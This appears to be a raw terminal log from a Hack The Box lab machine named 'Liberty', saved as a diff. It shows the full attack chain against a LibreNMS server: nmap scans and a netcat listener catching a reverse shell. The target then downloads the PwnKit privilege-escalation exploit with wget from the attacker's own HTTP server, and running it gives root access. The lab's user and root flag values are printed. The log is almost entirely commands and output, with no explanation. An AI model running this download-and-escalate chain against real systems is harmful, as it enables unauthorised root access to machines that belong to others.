@@ -1,0 +1,457 @@
+┌─[eu-dedicated-18-dhcp]─[10.10.14.5]─[adebayoade@htb-fxnslom8d6]─[~]
+└──╼ [★]$ cd Desktop
+┌─[eu-dedicated-18-dhcp]─[10.10.14.5]─[adebayoade@htb-fxnslom8d6]─[~/Desktop]
+└──╼ [★]$ mkdir HTB
+┌─[eu-dedicated-18-dhcp]─[10.10.14.5]─[adebayoade@htb-fxnslom8d6]─[~/Desktop]
+└──╼ [★]$ cd HTB/
+┌─[eu-dedicated-18-dhcp]─[10.10.14.5]─[adebayoade@htb-fxnslom8d6]─[~/Desktop/HTB]
+└──╼ [★]$ mkdir Liberty
+┌─[eu-dedicated-18-dhcp]─[10.10.14.5]─[adebayoade@htb-fxnslom8d6]─[~/Desktop/HTB]
+└──╼ [★]$ cd Liberty/
+┌─[eu-dedicated-18-dhcp]─[10.10.14.5]─[adebayoade@htb-fxnslom8d6]─[~/Desktop/HTB/Liberty]
+└──╼ [★]$ nmap -sC -sV -oN initial-reconn 10.129.5.140
+Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-12-31 09:57 CST
+Nmap scan report for 10.129.5.140
+Host is up (0.0088s latency).
+Not shown: 998 closed tcp ports (reset)
+PORT   STATE SERVICE VERSION
+22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4 (Ubuntu Linux; protocol 2.0)
+| ssh-hostkey:
+|   3072 48:ad:d5:b8:3a:9f:bc:be:f7:e8:20:1e:f6:bf:de:ae (RSA)
+|   256 b7:89:6c:0b:20:ed:49:b2:c1:86:7c:29:92:74:1c:1f (ECDSA)
+|_  256 18:cd:9d:08:a6:21:a8:b8:b6:f7:9f:8d:40:51:54:fb (ED25519)
+80/tcp open  http    nginx 1.18.0 (Ubuntu)
+| http-title: LibreNMS
+|_Requested resource was http://10.129.5.140/login
+|_http-trane-info: Problem with XML parsing of /evox/about
+|_http-server-header: nginx/1.18.0 (Ubuntu)
+| http-robots.txt: 1 disallowed entry
+|_/
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 7.05 seconds
+┌─[eu-dedicated-18-dhcp]─[10.10.14.5]─[adebayoade@htb-fxnslom8d6]─[~/Desktop/HTB/Liberty]
+└──╼ [★]$ nmap -A -sV -oN aggressive 10.129.5.140
+Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-12-31 09:57 CST
+Nmap scan report for 10.129.5.140
+Host is up (0.0080s latency).
+Not shown: 998 closed tcp ports (reset)
+PORT   STATE SERVICE VERSION
+22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4 (Ubuntu Linux; protocol 2.0)
+| ssh-hostkey:
+|   3072 48:ad:d5:b8:3a:9f:bc:be:f7:e8:20:1e:f6:bf:de:ae (RSA)
+|   256 b7:89:6c:0b:20:ed:49:b2:c1:86:7c:29:92:74:1c:1f (ECDSA)
+|_  256 18:cd:9d:08:a6:21:a8:b8:b6:f7:9f:8d:40:51:54:fb (ED25519)
+80/tcp open  http    nginx 1.18.0 (Ubuntu)
+|_http-server-header: nginx/1.18.0 (Ubuntu)
+| http-robots.txt: 1 disallowed entry
+|_/
+|_http-trane-info: Problem with XML parsing of /evox/about
+| http-title: LibreNMS
+|_Requested resource was http://10.129.5.140/login
+No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).
+TCP/IP fingerprint:
+OS:SCAN(V=7.94SVN%E=4%D=12/31%OT=22%CT=1%CU=37706%PV=Y%DS=2%DC=T%G=Y%TM=695
+OS:54814%P=x86_64-pc-linux-gnu)SEQ(SP=104%GCD=1%ISR=10D%TI=Z%CI=Z%II=I%TS=A
+OS:)OPS(O1=M552ST11NW7%O2=M552ST11NW7%O3=M552NNT11NW7%O4=M552ST11NW7%O5=M55
+OS:2ST11NW7%O6=M552ST11)WIN(W1=FE88%W2=FE88%W3=FE88%W4=FE88%W5=FE88%W6=FE88
+OS:)ECN(R=Y%DF=Y%T=40%W=FAF0%O=M552NNSNW7%CC=Y%Q=)T1(R=Y%DF=Y%T=40%S=O%A=S+
+OS:%F=AS%RD=0%Q=)T2(R=N)T3(R=N)T4(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)
+OS:T5(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)T6(R=Y%DF=Y%T=40%W=0%S=A%A
+OS:=Z%F=R%O=%RD=0%Q=)T7(R=N)U1(R=Y%DF=N%T=40%IPL=164%UN=0%RIPL=G%RID=G%RIPC
+OS:K=G%RUCK=G%RUD=G)IE(R=Y%DFI=N%T=40%CD=S)
+
+Network Distance: 2 hops
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+
+TRACEROUTE (using port 80/tcp)
+HOP RTT     ADDRESS
+1   7.74 ms 10.10.14.1
+2   8.11 ms 10.129.5.140
+
+OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 18.56 seconds
+┌─[eu-dedicated-18-dhcp]─[10.10.14.5]─[adebayoade@htb-fxnslom8d6]─[~/Desktop/HTB/Liberty]
+└──╼ [★]$ nc -lvnp 4444
+listening on [any] 4444 ...
+^C
+┌─[eu-dedicated-18-dhcp]─[10.10.14.5]─[adebayoade@htb-fxnslom8d6]─[~/Desktop/HTB/Liberty]
+└──╼ [★]$ nc -lvnp 8888
+listening on [any] 8888 ...
+connect to [10.10.14.5] from (UNKNOWN) [10.129.5.140] 40072
+bash: cannot set terminal process group (958): Inappropriate ioctl for device
+bash: no job control in this shell
+librenms@liberty:~/html$ getuid
+getuid
+
+Command 'getuid' not found, did you mean:
+
+  command 'setuid' from deb super (3.30.1-1)
+
+Try: apt install <deb name>
+
+librenms@liberty:~/html$ id
+id
+uid=997(librenms) gid=997(librenms) groups=997(librenms)
+librenms@liberty:~/html$ dir
+dir
+ajax_dash.php	      billing-graph.php   install.php
+ajax_form.php	      calendar.jpg	  js
+ajax_list.php	      css		  legacy
+ajax_listports.php    csv.php		  legacy_api_v0.php
+ajax_mapview.php      data.php		  legacy_index.php
+ajax_ossuggest.php    favicon.ico	  netcmd.php
+ajax_output.php       fonts		  network-map.php
+ajax_rulesuggest.php  graph-realtime.php  pages
+ajax_search.php       graph.php		  pdf.php
+ajax_table.php	      images		  plugins
+api_v0.php	      includes		  robots.txt
+bandwidth-graph.php   index.php
+librenms@liberty:~/html$ cd ..
+cd ..
+librenms@liberty:~$ dir
+dir
+AUTHORS.md	       config_to_json.php     ping.php
+CHANGELOG.md	       contrib		      poll-billing.php
+CODE_OF_CONDUCT.md     cronic		      poller-service.py
+CONTRIBUTING.md        daily.php	      poller-wrapper.py
+LICENSE.txt	       daily.sh		      poller.php
+LibreNMS	       database		      readmegen.yml
+Makefile	       delhost.php	      renamehost.php
+README.md	       discovery-wrapper.py   requirements.txt
+addhost.php	       discovery.php	      resources
+adduser.php	       dist-pollers.php       routes
+alerts.php	       doc		      rrd
+app		       html		      scripts
+artisan		       includes		      server.php
+billing-calculate.php  irc.php		      services-wrapper.py
+bootstrap	       librenms-service.py    snmp-scan.py
+build-base.php	       librenms.cron	      snmp.conf.example
+build.sql	       librenms.nonroot.cron  snmpd.conf.example
+cache		       licenses		      snmptrap.php
+check-services.php     logs		      sql-schema
+composer.json	       mibs		      storage
+composer.lock	       misc		      syslog.php
+composer.phar	       mkdocs.yml	      tests
+config		       package.json	      validate.php
+config.php	       pbin.sh		      vendor
+config.php.default     phpunit.xml	      webpack.mix.js
+librenms@liberty:~$ cd ..
+cd ..
+librenms@liberty:/opt$ dir
+dir
+librenms
+librenms@liberty:/opt$ cd ..
+cd ..
+librenms@liberty:/$ ls
+ls
+bin
+boot
+cdrom
+dev
+etc
+home
+lib
+lib32
+lib64
+libx32
+lost+found
+media
+mnt
+opt
+proc
+root
+run
+sbin
+snap
+srv
+sys
+tmp
+usr
+var
+librenms@liberty:/$ cd home
+cd home
+librenms@liberty:/home$ dir
+dir
+cecilia
+librenms@liberty:/home$ cd cecelia
+cd cecelia
+bash: cd: cecelia: No such file or directory
+librenms@liberty:/home$ cd cecelia
+cd cecelia
+bash: cd: cecelia: No such file or directory
+librenms@liberty:/home$ cd cecilia
+cd cecilia
+librenms@liberty:/home/cecilia$ dir
+dir
+user.txt
+librenms@liberty:/home/cecilia$ cat user.txt
+cat user.txt
+2545c691b225b0fc2c876d9e21198beb
+librenms@liberty:/home/cecilia$ cd ..
+cd ..
+librenms@liberty:/home$ cd ..
+cd ..
+librenms@liberty:/$ dir
+dir
+bin   cdrom  etc   lib	  lib64   lost+found  mnt  proc  run   snap  sys  usr
+boot  dev    home  lib32  libx32  media       opt  root  sbin  srv   tmp  var
+librenms@liberty:/$ cd tmp
+cd tmp
+librenms@liberty:/tmp$ wget http://10.10.14.5:8000/PwnKit.zip
+wget http://10.10.14.5:8000/PwnKit.zip
+--2025-12-31 18:32:21--  http://10.10.14.5:8000/PwnKit.zip
+Connecting to 10.10.14.5:8000... connected.
+HTTP request sent, awaiting response... 200 OK
+Length: 337827 (330K) [application/zip]
+Saving to: 'PwnKit.zip'
+
+     0K .......... .......... .......... .......... .......... 15% 2.99M 0s
+    50K .......... .......... .......... .......... .......... 30% 5.29M 0s
+   100K .......... .......... .......... .......... .......... 45% 39.8M 0s
+   150K .......... .......... .......... .......... .......... 60% 8.02M 0s
+   200K .......... .......... .......... .......... .......... 75% 13.6M 0s
+   250K .......... .......... .......... .......... .......... 90% 31.3M 0s
+   300K .......... .......... .........                       100%  215M=0.04s
+
+2025-12-31 18:32:21 (8.44 MB/s) - 'PwnKit.zip' saved [337827/337827]
+
+librenms@liberty:/tmp$ ls
+ls
+PwnKit.zip
+snap.lxd
+systemd-private-f295cbc7d4c94d88b4c1fa64d494be6d-fwupd.service-VrH2oj
+systemd-private-f295cbc7d4c94d88b4c1fa64d494be6d-systemd-logind.service-tvkC1g
+systemd-private-f295cbc7d4c94d88b4c1fa64d494be6d-systemd-resolved.service-YyU0Oh
+systemd-private-f295cbc7d4c94d88b4c1fa64d494be6d-systemd-timesyncd.service-uMyIQf
+vmware-root_715-4281843213
+librenms@liberty:/tmp$ unzip PwnKit
+unzip PwnKit
+Archive:  PwnKit.zip
+1923ad7b438ae82eaa2162e15a1e1b810712e54e
+   creating: PwnKit-main/
+  inflating: PwnKit-main/LICENSE
+  inflating: PwnKit-main/Makefile
+  inflating: PwnKit-main/PwnKit
+  inflating: PwnKit-main/PwnKit.c
+  inflating: PwnKit-main/PwnKit.sh
+  inflating: PwnKit-main/PwnKit32
+  inflating: PwnKit-main/README.md
+   creating: PwnKit-main/imgs/
+  inflating: PwnKit-main/imgs/exploit.png
+  inflating: PwnKit-main/imgs/oneliner.png
+  inflating: PwnKit-main/imgs/patched.png
+librenms@liberty:/tmp$ ls
+ls
+PwnKit-main
+PwnKit.zip
+snap.lxd
+systemd-private-f295cbc7d4c94d88b4c1fa64d494be6d-fwupd.service-VrH2oj
+systemd-private-f295cbc7d4c94d88b4c1fa64d494be6d-systemd-logind.service-tvkC1g
+systemd-private-f295cbc7d4c94d88b4c1fa64d494be6d-systemd-resolved.service-YyU0Oh
+systemd-private-f295cbc7d4c94d88b4c1fa64d494be6d-systemd-timesyncd.service-uMyIQf
+vmware-root_715-4281843213
+librenms@liberty:/tmp$ cd PwnKit-main
+cd PwnKit-main
+librenms@liberty:/tmp/PwnKit-main$ ls
+ls
+LICENSE
+Makefile
+PwnKit
+PwnKit.c
+PwnKit.sh
+PwnKit32
+README.md
+imgs
+librenms@liberty:/tmp/PwnKit-main$ ./PwnKit
+./PwnKit
+id
+uid=0(root) gid=0(root) groups=0(root),997(librenms)
+ls
+LICENSE
+Makefile
+PwnKit
+PwnKit.c
+PwnKit.sh
+PwnKit32
+README.md
+imgs
+cd .
+cd ..
+ls
+PwnKit-main
+PwnKit.zip
+snap.lxd
+systemd-private-f295cbc7d4c94d88b4c1fa64d494be6d-fwupd.service-VrH2oj
+systemd-private-f295cbc7d4c94d88b4c1fa64d494be6d-systemd-logind.service-tvkC1g
+systemd-private-f295cbc7d4c94d88b4c1fa64d494be6d-systemd-resolved.service-YyU0Oh
+systemd-private-f295cbc7d4c94d88b4c1fa64d494be6d-systemd-timesyncd.service-uMyIQf
+vmware-root_715-4281843213
+cd ..
+ls
+bin
+boot
+cdrom
+dev
+etc
+home
+lib
+lib32
+lib64
+libx32
+lost+found
+media
+mnt
+opt
+proc
+root
+run
+sbin
+snap
+srv
+sys
+tmp
+usr
+var
+cd home
+ls
+cecilia
+cd ..
+ls
+bin
+boot
+cdrom
+dev
+etc
+home
+lib
+lib32
+lib64
+libx32
+lost+found
+media
+mnt
+opt
+proc
+root
+run
+sbin
+snap
+srv
+sys
+tmp
+usr
+var
+cd usr
+ls
+bin
+games
+include
+lib
+lib32
+lib64
+libexec
+libx32
+local
+sbin
+share
+src
+cd ..
+ls
+bin
+boot
+cdrom
+dev
+etc
+home
+lib
+lib32
+lib64
+libx32
+lost+found
+media
+mnt
+opt
+proc
+root
+run
+sbin
+snap
+srv
+sys
+tmp
+usr
+var
+cd sys
+ls
+block
+bus
+class
+dev
+devices
+firmware
+fs
+hypervisor
+kernel
+module
+power
+cd ..
+ls
+bin
+boot
+cdrom
+dev
+etc
+home
+lib
+lib32
+lib64
+libx32
+lost+found
+media
+mnt
+opt
+proc
+root
+run
+sbin
+snap
+srv
+sys
+tmp
+usr
+var
+cd root
+ls
+root.txt
+snap
+cat root.txt
+b8e3d41e30284346ca9c5e24b2391b00
+
+Terminal 2:
+
+┌─[eu-dedicated-18-dhcp]─[10.10.14.5]─[adebayoade@htb-fxnslom8d6]─[~/Desktop/HTB/Liberty]
+└──╼ [★]$ cd Desktop
+bash: cd: Desktop: No such file or directory
+┌─[eu-dedicated-18-dhcp]─[10.10.14.5]─[adebayoade@htb-fxnslom8d6]─[~/Desktop/HTB/Liberty]
+└──╼ [★]$ cd Downloads
+bash: cd: Downloads: No such file or directory
+┌─[eu-dedicated-18-dhcp]─[10.10.14.5]─[adebayoade@htb-fxnslom8d6]─[~/Desktop/HTB/Liberty]
+└──╼ [★]$ cd ~
+┌─[eu-dedicated-18-dhcp]─[10.10.14.5]─[adebayoade@htb-fxnslom8d6]─[~]
+└──╼ [★]$ cd Downloads
+┌─[eu-dedicated-18-dhcp]─[10.10.14.5]─[adebayoade@htb-fxnslom8d6]─[~/Downloads]
+└──╼ [★]$ git clone https://github.com/ly4k/PwnKit.git
+Cloning into 'PwnKit'...
+remote: Enumerating objects: 46, done.
+remote: Counting objects: 100% (2/2), done.
+remote: Compressing objects: 100% (2/2), done.
+remote: Total 46 (delta 0), reused 0 (delta 0), pack-reused 44 (from 1)
+Receiving objects: 100% (46/46), 580.57 KiB | 72.57 MiB/s, done.
+Resolving deltas: 100% (15/15), done.
+┌─[eu-dedicated-18-dhcp]─[10.10.14.5]─[adebayoade@htb-fxnslom8d6]─[~/Downloads]
+└──╼ [★]$ python3 -m http.server 8000
+Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...
+10.129.5.140 - - [31/Dec/2025 10:32:20] "GET /PwnKit.zip HTTP/1.1" 200 -
+
